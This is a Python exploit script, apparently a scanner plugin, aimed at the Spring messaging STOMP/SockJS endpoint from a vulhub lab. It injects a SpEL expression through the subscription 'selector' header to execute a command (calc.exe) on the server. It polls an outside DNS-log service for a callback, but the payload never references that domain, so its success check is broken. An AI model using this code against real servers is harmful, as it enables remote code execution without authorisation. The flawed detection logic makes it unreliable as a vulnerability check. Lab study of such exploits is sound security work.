# -*- coding: utf-8 -*-  
# !/usr/bin/env python3
import requests
import random
import string
import time
import threading
import logging
import sys
import json

logging.basicConfig(stream=sys.stdout, level=logging.INFO)


def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))


class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
        print(self.base)
        self.daemon = True
        self.session = requests.session()
        self.session.headers = {
            'Referer': url,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        }
        self.t = int(time.time() * 1000)

    def run(self):
        url = f'{self.base}/htmlfile?c=_jp.vulhub'
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)

    def send(self, command, headers, body=''):
        data = [command.upper(), '\n']
        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))

        data.append('\n\n')
        data.append(body)
        data.append('\x00')
        data = json.dumps([''.join(data)])

        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)
        print(response)
        print(response.url)
        if response.status_code != 204:
            logging.info(f"send '{command}' data error.")
        else:
            logging.info(f"send '{command}' data success.")

    def __del__(self):
        self.session.close()


def getdomain():
    try:
        s = requests.post("http://api.dnslog.gq:88/v1/users", timeout=10)
        token = s.json()['data']['token']
        domain = s.json()['data']['identity']
        domain = str(domain)
        token = str(token)
    except Exception as e:
        print(e)
    return domain, token


def getresult(domain, token):
    try:
        s1 = requests.get(f"http://api.dnslog.gq:88/v1/records?type=dns&token={token}&filter=")
        records = s1.json()['data'][0]['name']
        if records == domain:
            return True
    except Exception as e:
        print(e)


def check(url):
    ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
    sockjs = SockJS(url + '/gs-guide-websocket')
    sockjs.start()
    time.sleep(1)
    try:
        sockjs.send('connect', {
            'accept-version': '1.1,1.0',
            'heart-beat': '10000,10000'
        })
        domain, token = getdomain()
        print(domain + " " + token)
        sockjs.send('subscribe', {
            'selector': f"T(java.lang.Runtime).getRuntime().exec('calc.exe')",
            'id': 'sub-0',
            'destination': '/topic/greetings'
        })
        data = json.dumps({'name': 'vulhub'})
        sockjs.send('send', {
            'content-length': len(data),
            'destination': '/app/hello'
        }, data)
        time.sleep(3)
        result = getresult(domain, token)
        print(result)
        if result:
            ret['success'] = True
    except Exception as e:
        print(e)
    return ret


def main(params):
    result = params.get('result', {})
    url = params.get('url', '')
    headers = params.get('headers', {})
    proxies = params.get('proxies', None)  # 代理
    timeout = params.get('timeout', 5)  # 超时时间
    result = check(url)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 30,
        ###可选参数###
        'url': "http://127.0.0.1:8080",
    }
    print(main(params))
